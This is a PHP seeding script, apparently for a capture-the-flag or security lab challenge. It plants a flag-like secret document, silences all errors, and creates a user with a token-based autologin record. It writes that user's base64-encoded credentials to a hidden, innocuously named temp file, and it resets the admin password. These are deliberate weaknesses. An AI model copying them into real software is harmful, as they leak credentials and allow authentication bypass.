<?php
error_reporting(0);
ini_set('display_errors', '0');
ini_set('display_startup_errors', '0');
ini_set('log_errors', '0');
ini_set('error_log', '');
$host = 'db';
$account = 'fake';
$password = 'fake';
$db = 'document';
$conn = mysqli_connect($host,$account,$password,$db);

if ($conn) {
	try {
		$codeResult = $conn->query("SELECT content FROM document WHERE title = 'TOP SECRET DOCUMENT' LIMIT 1");
		$codeRow = $codeResult ? $codeResult->fetch_assoc() : null;
		if (empty($codeRow['content'])) {
			$runtimeCode = 'ARCHIVE-' . strtoupper(bin2hex(random_bytes(8)));
			$codeStmt = $conn->prepare(
				"UPDATE document SET content = ? WHERE title = 'TOP SECRET DOCUMENT'"
			);
			if ($codeStmt) {
				$codeStmt->bind_param('s', $runtimeCode);
				$codeStmt->execute();
				$codeStmt->close();
			}
		}

		$markerFile = sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.review_rotation_cache';
		$adminMarker = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'seeded_admin';
		$alphabet = 'abcdef';
		$maxAttempts = 10;
		$createdUser = '';
		$createdPassword = '';
		$createdLink = '';
		$usernameLength = 10;
		$passwordBytes = 12;

		if (!file_exists($markerFile)) {
			for ($i = 0; $i < $maxAttempts; $i++) {
				$username = '';
				for ($j = 0; $j < $usernameLength; $j++) {
					$username .= $alphabet[random_int(0, strlen($alphabet) - 1)];
				}

				$passwordPlain = bin2hex(random_bytes($passwordBytes));
				$hash = password_hash($passwordPlain, PASSWORD_DEFAULT);
				$stmt = $conn->prepare("INSERT INTO users (username, password_hash) VALUES (?, ?)");
				if (!$stmt) {
					break;
				}
				$stmt->bind_param('ss', $username, $hash);
				if ($stmt->execute()) {
					$seedUserId = (int)$conn->insert_id;
					if ($seedUserId === 0) {
						$idLookup = $conn->prepare("SELECT id FROM users WHERE username = ? LIMIT 1");
						if ($idLookup) {
							$idLookup->bind_param('s', $username);
							$idLookup->execute();
							$idResult = $idLookup->get_result();
							if ($idRow = $idResult->fetch_assoc()) {
								$seedUserId = (int)$idRow['id'];
							}
							$idLookup->close();
						}
					}
					$createdUser = $username;
					$createdPassword = $passwordPlain;
					$token = bin2hex(random_bytes(16));
					$record = [
						'status' => 'active',
						'email_list' => '',
						'token' => $token,
						'expiry_mode' => 'unchecked',
						'expires_on' => date('Y-m-d', strtotime('+30 days')),
						'unlimited_use' => 'checked',
					];
					$serialized = serialize($record);
					if ($seedUserId > 0) {
						$metaStmt = $conn->prepare("INSERT INTO user_meta (user_id, meta_key, meta_value) VALUES (?, 'vault_autologin_record', ?) ON DUPLICATE KEY UPDATE meta_value = VALUES(meta_value)");
						if ($metaStmt) {
							$metaStmt->bind_param('is', $seedUserId, $serialized);
							if ($metaStmt->execute()) {
								$createdLink = '/autologin.php?vault_key=' . urlencode($token);
							}
							$metaStmt->close();
						}
					}
					$stmt->close();
					break;
				}
				$stmt->close();
			}

			if ($createdUser !== '' && $createdLink !== '') {
				$fileContent = "queue=review-handoff\n";
				$fileContent .= "principal=" . base64_encode($createdUser) . "\n";
				$fileContent .= "proof=" . base64_encode($createdPassword) . "\n";
				$fileContent .= "rotation=portal\n";
				file_put_contents($markerFile, $fileContent);
			}
		}

		if (!file_exists($adminMarker)) {
			$adminPassword = bin2hex(random_bytes($passwordBytes));
			$adminHash = password_hash($adminPassword, PASSWORD_DEFAULT);
			$adminStmt = $conn->prepare("INSERT INTO users (username, password_hash) VALUES ('admin', ?) ON DUPLICATE KEY UPDATE password_hash = VALUES(password_hash)");
			if ($adminStmt) {
				$adminStmt->bind_param('s', $adminHash);
				$adminStmt->execute();
				$adminStmt->close();
			}

			$adminId = null;
			$idStmt = $conn->prepare("SELECT id FROM users WHERE username = 'admin' LIMIT 1");
			if ($idStmt) {
				$idStmt->execute();
				$idResult = $idStmt->get_result();
				if ($idRow = $idResult->fetch_assoc()) {
					$adminId = (int)$idRow['id'];
				}
				$idStmt->close();
			}
			file_put_contents($adminMarker, "seeded\n");
		}
	} catch (Throwable $e) {
	}
}
?>
